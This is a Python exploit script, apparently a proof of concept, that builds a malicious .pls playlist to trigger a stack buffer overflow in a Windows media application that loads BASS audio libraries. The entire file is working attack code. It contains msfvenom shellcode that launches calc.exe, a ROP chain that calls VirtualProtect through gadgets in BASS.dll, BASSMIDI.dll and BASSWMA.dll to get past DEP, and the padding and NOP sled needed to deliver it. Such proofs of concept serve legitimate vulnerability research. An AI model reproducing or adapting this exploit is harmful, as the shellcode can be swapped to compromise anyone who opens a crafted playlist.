#!/usr/bin/python 
import os,sys
#msfvenom -a x86 --platform windows -p windows/exec CMD=calc.exe -b "\x00\x0a\x1a\x20\x40" -f python 

buf =  b""
buf += b"\xd9\xcb\xd9\x74\x24\xf4\xba\x66\xa1\x71\x5b\x5f\x31"
buf += b"\xc9\xb1\x31\x31\x57\x18\x03\x57\x18\x83\xef\x9a\x43"
buf += b"\x84\xa7\x8a\x06\x67\x58\x4a\x67\xe1\xbd\x7b\xa7\x95"
buf += b"\xb6\x2b\x17\xdd\x9b\xc7\xdc\xb3\x0f\x5c\x90\x1b\x3f"
buf += b"\xd5\x1f\x7a\x0e\xe6\x0c\xbe\x11\x64\x4f\x93\xf1\x55"
buf += b"\x80\xe6\xf0\x92\xfd\x0b\xa0\x4b\x89\xbe\x55\xf8\xc7"
buf += b"\x02\xdd\xb2\xc6\x02\x02\x02\xe8\x23\x95\x19\xb3\xe3"
buf += b"\x17\xce\xcf\xad\x0f\x13\xf5\x64\xbb\xe7\x81\x76\x6d"
buf += b"\x36\x69\xd4\x50\xf7\x98\x24\x94\x3f\x43\x53\xec\x3c"
buf += b"\xfe\x64\x2b\x3f\x24\xe0\xa8\xe7\xaf\x52\x15\x16\x63"
buf += b"\x04\xde\x14\xc8\x42\xb8\x38\xcf\x87\xb2\x44\x44\x26"
buf += b"\x15\xcd\x1e\x0d\xb1\x96\xc5\x2c\xe0\x72\xab\x51\xf2"
buf += b"\xdd\x14\xf4\x78\xf3\x41\x85\x22\x99\x94\x1b\x59\xef"
buf += b"\x97\x23\x62\x5f\xf0\x12\xe9\x30\x87\xaa\x38\x75\x77"
buf += b"\xe1\x61\xdf\x10\xac\xf3\x62\x7d\x4f\x2e\xa0\x78\xcc"
buf += b"\xdb\x58\x7f\xcc\xa9\x5d\x3b\x4a\x41\x2f\x54\x3f\x65"
buf += b"\x9c\x55\x6a\x06\x43\xc6\xf6\xe7\xe6\x6e\x9c\xf7"
rop = "\xe7\x5f\x01\x10" #POP EAX # RETN [BASS.dll] 
rop += "\x5c\xe2\x60\x10" #ptr to &VirtualProtect() [IAT BASSMIDI.dll] 
rop += "\xf1\xea\x01\x10" #MOV EAX,DWORD PTR DS:[EAX] # RTN [BASS.dll] 
rop += "\x50\x09\x03\x10" #XCHG EAX,ESI # RETN [BASS.dll] 
rop += "\x0c\x80\x60\x10" #POP EBP # RETN 0x0C [BASSMIDI.dll] 
rop += "\x9f\x53\x10\x10" #& jmp esp BASSWMA.dll 
rop += "\xe7\x5f\x01\x10" #POP EAX # RETN [BASS.dll] 
rop += "\x90"*12 
rop += "\xff\xfd\xff\xff" #201 in negative 
rop += "\xb4\x4d\x01\x10" #NEG EAX # RETN [BASS.dll] 
rop += "\x72\x2f\x03\x10" #XCHG EAX,EBX # RETN [BASS.dll] 
rop += "\xe7\x5f\x01\x10" #POP EAX # RETN [BASS.dll] 
rop += "\xc0\xff\xff\xff" #40 in negative 
rop += "\xb4\x4d\x01\x10" #NEG EAX # RETN [BASS.dll] 
rop += "\x6c\x8a\x03\x10" #XCHG EAX,EDX # RETN [BASS.dll] 
rop += "\x07\x10\x10\x10" #POP ECX # RETN [BASSWMA.dll] 
rop += "\x93\x83\x10\x10" #&Writable location [BASSWMA.dll] 
rop += "\x04\xdc\x01\x10" #POP EDI # RETN [BASS.dll] 
rop += "\x84\xa0\x03\x10" #RETN [BASS.dll] 
rop += "\xe7\x5f\x01\x10" #POP EAX # RETN [BASS.dll] 
rop += "\x90"*4 
rop += "\xa5\xd7\x01\x10" #PUSHAD # RETN [BASS.dll] 
exploit = "\x41"*1012 + rop + "\x90"*8 + buf 

file = open('final.pls','w') 
file.write(exploit) 
file.close()